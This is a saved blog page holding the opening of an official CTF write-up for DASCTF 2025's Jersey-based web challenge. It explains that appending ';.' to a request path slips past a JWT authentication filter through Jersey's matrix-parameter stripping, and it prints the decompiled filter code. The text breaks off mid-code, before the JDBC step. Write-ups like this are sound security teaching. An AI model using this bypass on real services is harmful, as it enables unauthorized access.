<meta property="og:image" content="https://cdn.nlark.com/yuque/__latex/d4cd21d60552e207f237e82def9029b6.svg">
<meta property="og:image" content="https://cdn.nlark.com/yuque/__latex/2f835c4c78e8aaa1beed651b18943ffe.svg">
<meta property="og:image" content="https://cdn.nlark.com/yuque/__latex/d4cd21d60552e207f237e82def9029b6.svg">
<meta property="og:image" content="https://cdn.nlark.com/yuque/__latex/98a04d7b226b69250e7de0fab1524971.svg">
<meta property="og:image" content="https://cdn.nlark.com/yuque/__latex/cbcea8e19531a951a056a1c3e0a85e78.svg">
<meta property="og:image" content="https://cdn.nlark.com/yuque/__latex/712ecf7894348e92d8779c3ee87eeeb0.svg">
<meta property="og:image" content="https://cdn.nlark.com/yuque/__latex/8ebdef850df2201f563af2e8c5e2f882.svg">
<meta property="og:image" content="https://cdn.nlark.com/yuque/__latex/d4cd21d60552e207f237e82def9029b6.svg">
<meta property="og:image" content="https://cdn.nlark.com/yuque/__latex/34c7b563b30bde3c748139530686798e.svg">
<meta property="og:image" content="https://cdn.nlark.com/yuque/__latex/5a317babd007431f27b3f97b685bcd0b.svg">
<meta property="og:image" content="https://cdn.nlark.com/yuque/__latex/61d02b7e5ab97d7f9405b83a6184923f.svg">
<meta property="og:image" content="https://cdn.nlark.com/yuque/__latex/b5bbb8cde94e3abf4bed98b57a5fabfe.svg">
<meta property="og:image" content="https://cdn.nlark.com/yuque/__latex/11192e973cb981fa31ae30223f22f28b.svg">
<meta property="og:image" content="https://cdn.nlark.com/yuque/__latex/2af86c1d61b93a73cfc0ec436ab5d60b.svg">
<meta property="og:image" content="https://c.img.dasctf.com/LightPicture/2025/06/12c80faf9b97ac47.png">
<meta property="og:image" content="https://c.img.dasctf.com/LightPicture/2025/06/16dedde90c6dd84a.png">
<meta property="og:image" content="https://c.img.dasctf.com/LightPicture/2025/06/53d9420d1e72c0f4.png">
<meta property="og:image" content="https://c.img.dasctf.com/LightPicture/2025/06/73234d6cd7007dcf.png">
<meta property="og:image" content="https://c.img.dasctf.com/LightPicture/2025/06/3f9213b0381132be.png">
<meta property="og:image" content="https://c.img.dasctf.com/LightPicture/2025/06/e3d25826e36b7c6d.png">
<meta property="og:image" content="https://c.img.dasctf.com/LightPicture/2025/06/19e91a7247f1590e.png">
<meta property="og:image" content="https://c.img.dasctf.com/LightPicture/2025/06/5680269f14e250fd.png">
<meta property="og:image" content="https://c.img.dasctf.com/LightPicture/2025/05/88546a4fb07aca25.jpg">
<meta property="og:image" content="https://c.img.dasctf.com/LightPicture/2025/05/9709881ef667c251.jpg">
<meta property="og:image" content="https://c.img.dasctf.com/LightPicture/2025/05/93f83971015833e2.jpg">
<meta property="og:image" content="https://c.img.dasctf.com/LightPicture/2025/05/fa889997b81acb16.jpg">
<meta property="og:image" content="https://c.img.dasctf.com/LightPicture/2025/05/0307b9702971f25e.jpg">
<meta property="og:image" content="https://c.img.dasctf.com/LightPicture/2025/05/a09861fe795cf507.png">
<meta property="og:image" content="https://c.img.dasctf.com/LightPicture/2025/06/2fced3566cbf9b57.jpg">
<meta property="og:image" content="https://c.img.dasctf.com/LightPicture/2025/05/424729ecb4af3350.jpg">
<meta property="og:image" content="https://c.img.dasctf.com/LightPicture/2025/06/ec480c28ed40e26a.jpg">
<meta property="og:image" content="https://c.img.dasctf.com/LightPicture/2025/06/25b7f8f393a99ccd.jpg">
<meta property="og:image" content="https://c.img.dasctf.com/LightPicture/2025/06/063c413cb528ccc2.jpg">
<meta property="og:image" content="https://c.img.dasctf.com/LightPicture/2025/06/b96c556a31c30efc.png">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/40360431/1750648158144-41e626a5-f4c9-4d97-b14e-4487fa1706ed.png">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/40360431/1750648158297-ed965866-1ae3-4a3d-8881-9c022e6ddff3.png">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/40360431/1750648158095-ae2d6cf4-0287-4f46-a461-d776166181ef.png">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/40360431/1750648158361-3cf7fad0-02dd-4a4f-acdd-94aafbbcd252.png">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/40360431/1750648157990-cef57395-c837-4356-995b-63f18476ffc8.png">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/40360431/1750648159047-822e0639-fc8c-4097-adad-1987fa9952c9.png">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/40360431/1750648159129-03335daa-23b7-46aa-99ce-50927142dd4a.png">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/40360431/1750648159059-ec465450-3dab-4148-b1b3-f3de1f4a08fe.png">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/40360431/1750648159091-7a4e4a0d-f015-4673-a328-1cb89d64fbc1.png">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/40360431/1750648159440-e5f33af9-e07e-4af5-8154-6b920e9d8df7.png">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/40360431/1750648159771-13c75102-dbda-4c8b-8ce2-037ff1c03ec5.png">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/40360431/1750648160046-205f14fe-7b69-43c9-820c-9de8be6f77b9.png">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/40360431/1750648159694-c642d281-52ad-4d88-a7f8-02121185fb0d.png">
<meta property="article:published_time" content="2025-08-02T11:07:05.000Z">
<meta property="article:modified_time" content="2025-09-13T10:46:44.748Z">
<meta property="article:author" content="xiaolaisec">
<meta property="article:tag" content="CTF">
<meta property="article:tag" content="JAVA">
<meta property="article:tag" content="PHP">
<meta property="article:tag" content="Python">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://c.img.dasctf.com/LightPicture/2025/06/e3679d5b9cf3a51c.jpg">
    
    
    <!--- Icon Part-->
    <link rel="icon" type="image/png" href="/images/redefine-favicon.svg" sizes="192x192">
    <link rel="apple-touch-icon" sizes="180x180" href="/images/redefine-favicon.svg">
    <meta name="theme-color" content="#A31F34">
    <link rel="shortcut icon" href="/images/redefine-favicon.svg">
    <!--- Page Info-->
    
    <title>
        
            DASCTF2025上半年赛官方WP -
        
        Welcome to xiaolaisec&#39;s blog
    </title>

    
<link rel="stylesheet" href="/fonts/Chillax/chillax.css">


    
        <style>
    :root {
        --preloader-background-color: #fff;
        --preloader-text-color: #000;
    }

    @media (prefers-color-scheme: dark) {
        :root {
            --preloader-background-color: #202124;
            --preloader-text-color: #fff;
        }
    }

    @media (prefers-color-scheme: light) {
        :root {
            --preloader-background-color: #fff;
            --preloader-text-color: #000;
        }
    }

    @media (max-width: 600px) {
        .ml13 {
            font-size: 2.6rem !important; /* Adjust this value as needed */
        }
    }

    .preloader {
        display: flex;
        flex-direction: column;
        gap: 1rem; /* Tailwind 'gap-4' is 1rem */
        align-items: center;
        justify-content: center;
        position: fixed;
        padding: 12px;
        top: 0;
        right: 0;
        bottom: 0;
        left: 0;
        width: 100vw;
        height: 100vh; /* 'h-screen' is 100% of the viewport height */
        background-color: var(--preloader-background-color);
        z-index: 1100; /* 'z-[1100]' sets the z-index */
        transition: opacity 0.2s ease-in-out;
    }

    .ml13 {
        font-size: 3.2rem;
        /* text-transform: uppercase; */
        color: var(--preloader-text-color);
        letter-spacing: -1px;
        font-weight: 500;
        font-family: 'Chillax-Variable', sans-serif;
        text-align: center;
    }

    .ml13 .word {
        display: inline-flex;
        flex-wrap: wrap;
        white-space: nowrap;
    }

    .ml13 .letter {
        display: inline-block;
        line-height: 1em;
    }
</style>

<div class="preloader">
    
<script src="/js/libs/anime.min.js"></script>

    <h1 class="ml13">
        Welcome to xiaolaisec&#39;s blog
    </h1>
    <script>
        var textWrapper = document.querySelector('.ml13');
        // Split text into words
        var words = textWrapper.textContent.trim().split(' ');

        // Clear the existing content
        textWrapper.innerHTML = '';

        // Wrap each word and its letters in spans
        words.forEach(function(word) {
            var wordSpan = document.createElement('span');
            wordSpan.classList.add('word');
            wordSpan.innerHTML = word.replace(/\S/g, "<span class='letter'>$&</span>");
            textWrapper.appendChild(wordSpan);
            textWrapper.appendChild(document.createTextNode(' ')); // Add space between words
        });


        anime.timeline({loop: true})
            .add({
                targets: '.ml13 .letter',
                translateY: [100,0],
                translateZ: 0,
                opacity: [0,1],
                easing: "easeOutExpo",
                duration: 1400,
                delay: (el, i) => 300 + 30 * i
            }).add({
            targets: '.ml13 .letter',
            translateY: [0,-100],
            opacity: [1,0],
            easing: "easeInExpo",
            duration: 1200,
            delay: (el, i) => 100 + 30 * i
        });

        let themeStatus = JSON.parse(localStorage.getItem('REDEFINE-THEME-STATUS'))?.isDark;

        // If the theme status is not found in local storage, check the preferred color scheme
        if (themeStatus === undefined || themeStatus === null) {
            if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
                themeStatus = 'dark';
            } else {
                themeStatus = 'light';
            }
        }

        // Now you can use the themeStatus variable in your code
        if (themeStatus) {
            document.documentElement.style.setProperty('--preloader-background-color', '#202124');
            document.documentElement.style.setProperty('--preloader-text-color', '#fff');
        } else {
            document.documentElement.style.setProperty('--preloader-background-color', '#fff');
            document.documentElement.style.setProperty('--preloader-text-color', '#000');
        }

        window.addEventListener('load', function () {
            hidePreloaderAfterTimeout(1000); // Hide after 1000 milliseconds once the window has loaded
        });

        // Backup failsafe: Hide preloader after a maximum of 5000 milliseconds, regardless of the window load event
        hidePreloaderAfterTimeout(5000);

        function hidePreloaderAfterTimeout(delay) {
            setTimeout(function () {
                var preloader = document.querySelector('.preloader');
                preloader.style.opacity = '0';
                setTimeout(function () {
                    preloader.style.display = 'none';
                }, 200);
            }, delay);
        }
    </script>
</div>
    

    
<link rel="stylesheet" href="/css/style.css">


    
        
<link rel="stylesheet" href="/assets/build/styles.css">

    

    
<link rel="stylesheet" href="/fonts/fonts.css">

    
<link rel="stylesheet" href="/fonts/Satoshi/satoshi.css">

    <!--- Font Part-->
    
    
    
    

    <!--- Inject Part-->
    
    <script id="hexo-configurations">
    window.config = {"hostname":"laijunyue.github.io","root":"/","language":"en"};
    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"title_alignment":"left","delete_mask":false,"headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","font":{"enable":false,"family":null,"url":null},"highlight_theme":{"light":"github","dark":"vs2015"}},"toc":{"enable":true,"max_depth":6,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]},"pangu_js":false},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"light"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":false,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":{"enable":false,"custom_message":null},"open_graph":{"enable":true,"image":"/images/redefine-og.webp","description":"Hexo Theme Redefine, Redefine Your Hexo Journey."},"google_analytics":{"enable":false,"id":null},"side_tools":{"gear_rotation":true,"auto_expand":false}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"xiaolaisec's blog","subtitle":{"text":["欢迎来到我的博客(｡･∀･)ﾉﾞ","悟已往之不谏，知来者之可追...","随心所欲地享受每一天\\(￣︶￣*\\))","随时随地，浏览记录O(∩_∩)O","如果喜欢，建议给个支持( •̀ ω •́ )✧","喜欢的话，留个言好嘛(oﾟvﾟ)ノ","你有建议？反馈作者(●^◡^●)","文字正在不断轮换(*￣3￣)╭","正在努力更新博客(ง •_•)ง","正在不断努力改善博客中ε=( o｀ω′)ノ"],"hitokoto":{"enable":false,"api":"https://v1.hitokoto.cn","show_author":false},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":false,"links":{"github":null,"instagram":null,"zhihu":null,"twitter":null,"email":null},"qrs":{"weixin":null},"style":"default"}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":false,"version":"11.4.1"}},"version":"2.6.0","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"}},"search":{"enable":false,"preload":true},"width":{"home":"1200px","pages":"1000px"}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"links":null,"show_on_mobile":true},"article_date_format":"auto","categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3},"excerpt_length":200},"footerStart":"2022/8/17 11:45:14"};
    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
    window.data = {"masonry":false};
  </script>
    
    <!--- Fontawesome Part-->
    
<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">

    
<link rel="stylesheet" href="/fontawesome/brands.min.css">

    
<link rel="stylesheet" href="/fontawesome/solid.min.css">

    
<link rel="stylesheet" href="/fontawesome/regular.min.css">

    
    
    
    
<meta name="generator" content="Hexo 6.3.0"></head>


<body>
<div class="progress-bar-container">
    

    
        <span class="pjax-progress-bar"></span>
<!--        <span class="swup-progress-icon">-->
<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
<!--        </span>-->
    
</div>


<main class="page-container" id="swup">

    

    <div class="main-content-container">


        <div class="main-content-header">
            <header class="navbar-container">

    <div class="navbar-content">
        <div class="left">
            
            <a class="logo-title" href="/">
                
                Welcome to xiaolaisec&#39;s blog
                
            </a>
        </div>

        <div class="right">
            <!-- PC -->
            <div class="desktop">
                <ul class="navbar-list">
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/"
                                        >
                                    <i class="fa-regular fa-house fa-fw"></i>
                                    HOME
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                    
                </ul>
            </div>
            <!-- Mobile -->
            <div class="mobile">
                
                <div class="icon-item navbar-bar">
                    <div class="navbar-bar-middle"></div>
                </div>
            </div>
        </div>
    </div>

    <!-- Mobile drawer -->
    <div class="navbar-drawer h-screen w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/"
                        >
                            <span>
                                HOME
                            </span>
                            
                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            
        </ul>

        <div class="statistics flex justify-around my-2.5">
    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">7</div>
        <div class="label text-third-text-color text-sm">Tags</div>
    </a>
    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">0</div>
        <div class="label text-third-text-color text-sm">Categories</div>
    </a>
    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">20</div>
        <div class="label text-third-text-color text-sm">Posts</div>
    </a>
</div>
    </div>

    <div class="window-mask"></div>

</header>


        </div>

        <div class="main-content-body">

            

            <div class="main-content">

                
                    <div class="post-page-container flex relative justify-between box-border w-full h-full">
    <div class="article-content-container">

        <div class="article-title relative w-full">
            
                <div class="w-full flex items-center pt-6 justify-start">
                    <h1 class="article-title-regular text-second-text-color text-4xl md:text-6xl font-bold px-2 sm:px-6 md:px-8 py-3">DASCTF2025上半年赛官方WP</h1>
                </div>
            
            </div>

        
            <div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
                <div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
                    <img src="/images/xiaolai.jpg">
                </div>
                <div class="info flex flex-col justify-between">
                    <div class="author flex items-center">
                        <span class="name text-default-text-color text-lg font-semibold">xiaolaisec</span>
                        
                            <span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv3</span>
                        
                    </div>
                    <div class="meta-info">
                        <div class="article-meta-info">
    <span class="article-date article-meta-item">
        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
        <span class="desktop">2025-08-02 19:07:05</span>
        <span class="mobile">2025-08-02 19:07:05</span>
        <span class="hover-info">Created</span>
    </span>
    
        <span class="article-date article-meta-item">
            <i class="fa-regular fa-wrench"></i>&nbsp;
            <span class="desktop">2025-09-13 18:46:44</span>
            <span class="mobile">2025-09-13 18:46:44</span>
            <span class="hover-info">Updated</span>
        </span>
    

    
    
        <span class="article-tags article-meta-item">
            <i class="fa-regular fa-tags"></i>&nbsp;
            <ul>
                
                    <li>
                        <a href="/tags/CTF/">CTF</a>&nbsp;
                    </li>
                
                    <li>
                        | <a href="/tags/JAVA/">JAVA</a>&nbsp;
                    </li>
                
                    <li>
                        | <a href="/tags/PHP/">PHP</a>&nbsp;
                    </li>
                
                    <li>
                        | <a href="/tags/Python/">Python</a>&nbsp;
                    </li>
                
            </ul>
        </span>
    

    
    
    
    
        <span class="article-pv article-meta-item">
            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
        </span>
    
</div>

                    </div>
                </div>
            </div>
        

        


        <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
            <h1 id="DASCTF2025上半年赛官方WP"><a href="#DASCTF2025上半年赛官方WP" class="headerlink" title="DASCTF2025上半年赛官方WP"></a>DASCTF2025上半年赛官方WP</h1><h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="题目-泽西岛"><a href="#题目-泽西岛" class="headerlink" title="题目-泽西岛"></a>题目-泽西岛</h2><p>附件给了一个war包，丢进tomcat webapps即可部署，需要的话可以远程调试，具体方法网上也很容易找到，这里不做过多叙述</p>
<p>一个用jersey框架写的web服务，用IDEA打开部署后的目录，分析目录结构，可以看到controller和filter，filter是用来作为认证服务的，可参考 <a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/taiyangdao/article/details/81979971" >https://blog.csdn.net/taiyangdao/article/details/81979971 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://c.img.dasctf.com/LightPicture/2025/06/e3679d5b9cf3a51c.jpg"
                      alt="null"
                ></p>
<p>然后看看这些controller，可以发现<code>/api/testConnection</code>有危险的H2 JDBC sink点。那么思路就很清晰了，首先考虑怎么绕过认证机制，然后考虑怎么绕过JDBC的过滤进一步利用</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://c.img.dasctf.com/LightPicture/2025/06/8d15e1918df8941d.jpg"
                      alt="null"
                ></p>
<p>先看看怎么认证绕过，可以发现这里认证的filter采用的jwt进行认证，而且key是随机值，无法预测或爆破，那么只能从其他地方下手了</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://c.img.dasctf.com/LightPicture/2025/06/294f6c9d42eec0c2.jpg"
                      alt="null"
                ></p>
<p>这里要考虑jersey框架的路由解析逻辑了，可以参考我之前写的 [<a class="link"   target="_blank" rel="noopener" href="https://blog.ph0ebus.cn/2025/04/03/Apache%20Pinot%20CVE-2024-56325%20Authentication%20Bypass%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/]" >https://blog.ph0ebus.cn/2025/04/03/Apache%20Pinot%20CVE-2024-56325%20Authentication%20Bypass%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/] <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>(<a class="link"   target="_blank" rel="noopener" href="https://blog.ph0ebus.cn/2025/04/03/Apache" >https://blog.ph0ebus.cn/2025/04/03/Apache <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> Pinot CVE-2024-56325 Authentication Bypass 漏洞分析&#x2F;) 的分析，就不大篇幅的展示细节了</p>
<p>关键点在<code>org.glassfish.jersey.server.internal.routing.SingleMatchResult#stripMatrixParams</code></p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> String <span class="title function_">stripMatrixParams</span><span class="params">(String path)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">e</span> <span class="operator">=</span> path.indexOf(<span class="number">59</span>);</span><br><span class="line">    <span class="keyword">if</span> (e == -<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> path;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">s</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            sb.append(path, s, e);</span><br><span class="line">            s = path.indexOf(<span class="number">47</span>, e + <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">if</span> (s == -<span class="number">1</span>) &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            e = path.indexOf(<span class="number">59</span>, s);</span><br><span class="line">        &#125; <span class="keyword">while</span>(e != -<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (s != -<span class="number">1</span>) &#123;</span><br><span class="line">            sb.append(path, s, path.length());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> sb.toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>简单点说，就是将传入的路径，进入这个函数进行处理，而这里的处理会忽略 <code>;</code>和<code>/</code>之间的内容，包括<code>;</code>，如果 <code>;</code>后面没有下一个<code>/</code>则忽略之后所有内容。例如 <code>/aaa;bbb/cccc;dddd</code>传入该函数后会返回 <code>/aaa/ccc</code>。</p>
<p>知道这个信息之后，这里绕过就很简单了，可以看到认证filter除了白名单路由可以无需认证外，满足不含<code>/</code>和且含<code>.</code>的要求，也是可以无需认证的，结合这里对传入路径的处理，只需要在需要访问的路径后面加入<code>;.</code>即可绕过认证</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Source code recreated from a .class file by IntelliJ IDEA</span></span><br><span class="line"><span class="comment">// (powered by FernFlower decompiler)</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> com.example.gfctf.auth;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.auth0.jwt.interfaces.DecodedJWT;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"><span class="keyword">import</span> java.util.Set;</span><br><span class="line"><span class="keyword">import</span> javax.ws.rs.container.ContainerRequestContext;</span><br><span class="line"><span class="keyword">import</span> javax.ws.rs.container.ContainerRequestFilter;</span><br><span class="line"><span class="keyword">import</span> javax.ws.rs.container.PreMatching;</span><br><span class="line"><span class="keyword">import</span> javax.ws.rs.core.Response;</span><br><span class="line"><span class="keyword">import</span> javax.ws.rs.core.Response.Status;</span><br><span class="line"><span class="keyword">import</span> javax.ws.rs.ext.Provider;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Provider</span></span><br><span class="line"><span class="meta">@PreMatching</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AuthenticationFilter</span> <span class="keyword">implements</span> <span class="title class_">ContainerRequestFilter</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Set&lt;String&gt; WHITELIST = <span class="keyword">new</span> <span class="title class_">HashSet</span>(Arrays.asList(<span class="string">&quot;&quot;</span>, <span class="string">&quot;test&quot;</span>, <span class="string">&quot;login&quot;</span>, <span class="string">&quot;register&quot;</span>));</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">AUTH_HEADER</span> <span class="operator">=</span> <span class="string">&quot;Authorization&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">BEARER_PREFIX</span> <span class="operator">=</span> <span class="string">&quot;Bearer &quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">AuthenticationFilter</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">filter</span><span class="params">(ContainerRequestContext containerRequestContext)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> containerRequestContext.getUriInfo().getPath();</span><br><span class="line">        <span class="keyword">if</span> (!isBaseFile(path) &amp;&amp; !WHITELIST.contains(path)) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">authHeader</span> <span class="operator">=</span> containerRequestContext.getHeaderString(<span class="string">&quot;Authorization&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (authHeader != <span class="literal">null</span> &amp;&amp; authHeader.startsWith(<span class="string">&quot;Bearer &quot;</span>)) &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">token</span> <span class="operator">=</span> authHeader.substring(<span class="string">&quot;Bearer &quot;</span>.length());</span><br><span class="line"></span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="type">DecodedJWT</span> <span class="variable">e</span> <span class="operator">=</span> JwtValidator.verifyJwt(token);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception var6) &#123;</span><br><span class="line">                    <span class="built_in">this</span>.abortWithUnauthorized(containerRequestContext);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="built_in">this</span>.abortWithUnauthorized(containerRequestContext);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">abortWithUnauthorized</span><span class="params">(ContainerRequestContext containerRequestContext)</span> &#123;</span><br><span class="line">        containerRequestContext.abortWith(Response.status(Status.UNAUTHORIZED).header(<span class="string">&quot;Location&quot;</span>, <span 